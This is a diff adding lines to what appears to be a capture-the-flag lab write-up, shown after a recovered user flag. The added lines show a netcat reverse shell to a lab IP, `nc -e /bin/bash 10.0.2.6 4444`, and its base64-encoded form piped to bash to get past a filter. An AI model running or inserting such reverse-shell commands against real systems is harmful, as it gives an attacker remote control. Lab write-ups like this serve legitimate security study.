@@ -82,3 +82,8 @@ And then I found the test encryption at : /testdata.txt as
 And here is the User Flag : `[user_flag_3353b67d6437f07ba7d34afd7d2fc27d]`
 
 
+Now, I just wanted to gain some shell from in here, which I could get using '/bin/bash' and Netcat liseners.
+
+Then I tried using the command : `nc -e /bin/bash 10.0.2.6 4444` but it didn't any thing, so I tried to encode it to base64 using : `echo 'nc -e /bin/bash 10.0.2.6 4444' | base64`
+
+And then there to use this command to gain access, we used : `echo 'bmMgLWUgL2Jpbi9iYXNoIDEwLjAuMi42IDQ0NDQK' | base64 -d | bash`
